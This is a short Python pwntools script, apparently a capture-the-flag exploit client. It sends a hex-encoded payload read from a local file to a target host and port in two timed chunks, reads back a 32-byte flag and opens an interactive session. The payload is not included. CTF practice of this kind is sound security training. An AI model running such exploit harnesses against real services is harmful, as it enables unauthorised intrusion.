from pwn import *
import sys
import time

ip = sys.argv[1]
port = int(sys.argv[2])

r = remote(ip, port)
data = open('xx', 'r').read()
payload = data.strip().decode('hex')

r.send(payload[:0x53])
sleep(0.5)
r.send(payload[0x53:])

print(repr(payload))

r.recvuntil('result is ')
flag = r.recvn(32)

print('FLAG:' + flag)
r.interactive()

